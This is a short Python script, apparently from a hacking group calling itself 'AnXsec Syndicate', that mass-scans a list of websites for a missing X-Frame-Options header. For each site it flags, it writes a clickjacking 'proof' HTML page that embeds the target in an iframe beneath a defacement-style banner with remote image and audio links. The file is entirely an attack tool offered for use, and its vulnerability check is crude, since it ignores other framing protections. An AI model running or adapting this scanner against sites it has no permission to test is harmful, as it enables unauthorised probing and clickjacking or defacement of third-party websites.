from urllib.request import urlopen
from sys import argv,exit

__author__="XAI666GHOST"

def checking(url):
    "untuk mengecek web nya vuln apa ga"

    try:
        if "http" not in url:
            url="http://"+url
        data=urlopen(url)
        headers=data.info()
        if "X-Frame-Options" not in headers:
            return True
    except:
        return False


def proof(url):
    payload="""
    <html>
      <title>AnXsec Syndicate</title>
      <center>
      <img src="https://d.top4top.io/p_1785i81jm0.png" weight="200" height="200"><br>
      <b><font face="courier new" size="9" color="red" style="text-shadow: 1px 0px 5px red;">AnXsec Syndicate</font></b><br>
      <audio src="https://l.top4top.io/m_1760o805r0.mp3"="autoplays" controls="controls" type="audio/mpeg"></audio>
      <iframe src="http://{}" width="1000" height="1000"></iframe>
      </center>

      </body>
    </html> """.format(url)
    with open(url +".html" ,"w") as file:
        file.write(payload)
        file.close()

def main():
    try:
        sites=open(argv[1] , 'r').readlines()
    except:
        print("[*] Usage: python(3) cj.py <file_name>");exit(0)

    for site in sites[0:]:
        print("[*] Checking " + site)
        status=checking(site)

        if(status):
            print("  [+] Website is Vulnerable!!")
            proof(site.split('\n')[0])

            print("  [+] Proof Created and Saved as <URL>.html\n")
        elif not status:
            print("  [-] Website is not Vulnerable!\n")

        else:
            print("Python Crashed please Re-Launch")

if __name__=='__main__':main()